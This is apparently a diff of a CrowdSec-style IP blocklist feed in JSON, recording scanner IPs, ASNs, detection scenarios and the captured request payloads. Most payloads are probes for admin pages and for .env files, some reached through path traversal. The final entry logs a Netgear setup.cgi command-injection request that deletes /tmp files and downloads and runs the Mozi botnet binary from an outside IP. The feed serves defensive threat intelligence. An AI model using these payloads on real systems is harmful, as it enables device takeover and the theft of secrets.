@@ -1,117 +1,13 @@
 {
-  "generated_at": "2026-11-28T01:00:00Z",
+  "generated_at": "2026-11-28T13:00:00Z",
   "ttl_days": 7,
   "scope": "crowdsec",
   "counts": {
-    "total": 61,
-    "v4": 61,
+    "total": 62,
+    "v4": 62,
     "v6": 0
   },
   "items": [
-    {
-      "ip": "134.33.66.210",
-      "family": "v4",
-      "first_seen": "2026-11-21T10:00:00Z",
-      "last_seen": "2026-11-21T10:00:00Z",
-      "scenarios": [
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "134.33.0.0/16",
-      "payloads": [
-        "GET /owa/auth/x.js"
-      ]
-    },
-    {
-      "ip": "216.180.246.67",
-      "family": "v4",
-      "first_seen": "2026-11-21T05:00:00Z",
-      "last_seen": "2026-11-21T05:00:00Z",
-      "scenarios": [
-        "crowdsec/http-admin-interface-probing",
-        "crowdsec/http-probing",
-        "crowdsec/http-technology-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "396982",
-      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
-      "asn_prefix": "216.180.246.0/24",
-      "payloads": [
-        "GET /admin/index.html",
-        "GET /+CSCOE+/logon.html",
-        "GET /remote/login",
-        "GET /",
-        "GET /login",
-        "GET /manage/account/login",
-        "GET /index.html",
-        "GET /cgi-bin/login.cgi",
-        "GET /login.htm",
-        "GET /login.html",
-        "GET /login.jsp",
-        "GET /doc/index.html"
-      ]
-    },
-    {
-      "ip": "20.12.242.90",
-      "family": "v4",
-      "first_seen": "2026-11-21T02:00:00Z",
-      "last_seen": "2026-11-21T02:00:00Z",
-      "scenarios": [
-        "crowdsec/http-technology-probing",
-        "suricata/ET SCAN Zmap User-Agent (Inbound)"
-      ],
-      "sources": [
-        "crowdsec",
-        "suricata"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "20.0.0.0/11",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /manager/html"
-      ]
-    },
-    {
-      "ip": "94.26.41.193",
-      "family": "v4",
-      "first_seen": "2026-11-21T01:00:00Z",
-      "last_seen": "2026-11-21T01:00:00Z",
-      "scenarios": [
-        "crowdsec/http-path-traversal-probing",
-        "crowdsec/http-probing",
-        "crowdsec/http-sensitive-files"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "207043",
-      "asn_name": "DEDIK-IO DEDIK SERVICES LIMITED",
-      "asn_prefix": "94.26.41.0/24",
-      "payloads": [
-        "GET /userfiles/x?path=../.env",
-        "GET /userfiles/x?path=../../.env",
-        "GET /userfiles/x?path=../../../.env",
-        "GET /index.php?mod=textviewer&src=../../../../.env",
-        "GET /script/.env",
-        "GET /.env",
-        "GET /.env.backup",
-        "GET /.env.bak",
-        "GET /api/.env",
-        "GET /index.php?option=com_acym&ctrl=frontentityselect&task=loadEntityFront&entity=list&offset=0&perCalls=1&join=none&columns=id,name",
-        "GET /api/v1/repos/search?limit=1",
-        "GET /p/assets/Li4vLi4vLmVudg",
-        "GET /p/assets/Li4vLi4vLi4vLmVudg"
-      ]
-    },
     {
       "ip": "168.144.246.50",
       "family": "v4",
@@ -1598,6 +1494,124 @@
         "GET /login.html",
         "GET /login.jsp",
         "GET /doc/index.html"
+      ]
+    },
+    {
+      "ip": "216.218.206.67",
+      "family": "v4",
+      "first_seen": "2026-11-28T10:00:00Z",
+      "last_seen": "2026-11-28T10:00:00Z",
+      "scenarios": [
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "6939",
+      "asn_name": "HURRICANE - Hurricane Electric LLC",
+      "asn_prefix": "216.218.128.0/17",
+      "tags": [
+        "mwl:scanner=\"shadowserver\""
+      ],
+      "payloads": [
+        "GET /remote/logincheck"
+      ]
+    },
+    {
+      "ip": "104.248.243.213",
+      "family": "v4",
+      "first_seen": "2026-11-28T10:00:00Z",
+      "last_seen": "2026-11-28T10:00:00Z",
+      "scenarios": [
+        "crowdsec/http-dos-swithcing-ua",
+        "crowdsec/http-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "14061",
+      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
+      "asn_prefix": "104.248.240.0/20",
+      "payloads": [
+        "HEAD /new/",
+        "HEAD /press/",
+        "HEAD /old/",
+        "HEAD /wp/",
+        "HEAD /media/",
+        "HEAD /news/",
+        "HEAD /shop/",
+        "HEAD /cms/",
+        "HEAD /portal/",
+        "HEAD /blog2/",
+        "HEAD /store/",
+        "HEAD /v2/",
+        "HEAD /2024/"
+      ]
+    },
+    {
+      "ip": "40.80.204.130",
+      "family": "v4",
+      "first_seen": "2026-11-28T04:00:00Z",
+      "last_seen": "2026-11-28T04:00:00Z",
+      "scenarios": [
+        "crowdsec/http-technology-probing",
+        "suricata/ET SCAN Zmap User-Agent (Inbound)"
+      ],
+      "sources": [
+        "crowdsec",
+        "suricata"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "40.80.0.0/12",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /manager/html"
+      ]
+    },
+    {
+      "ip": "20.163.58.153",
+      "family": "v4",
+      "first_seen": "2026-11-28T03:00:00Z",
+      "last_seen": "2026-11-28T03:00:00Z",
+      "scenarios": [
+        "crowdsec/http-cve-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.160.0.0/12",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /developmentserver/metadatauploader"
+      ]
+    },
+    {
+      "ip": "223.123.34.18",
+      "family": "v4",
+      "first_seen": "2026-11-28T03:00:00Z",
+      "last_seen": "2026-11-28T03:00:00Z",
+      "scenarios": [
+        "crowdsec/http-cve-probing",
+        "crowdsec/netgear_rce",
+        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
+      ],
+      "sources": [
+        "crowdsec",
+        "suricata"
+      ],
+      "asn": "138423",
+      "asn_name": "CMPAKLIMITED-AS-ENTCORP - CMPak Limited",
+      "asn_prefix": "223.123.34.0/24",
+      "payloads": [
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://223.123.34.18:39992/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://223.123.34.18:39992/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
       ]
     }
   ]
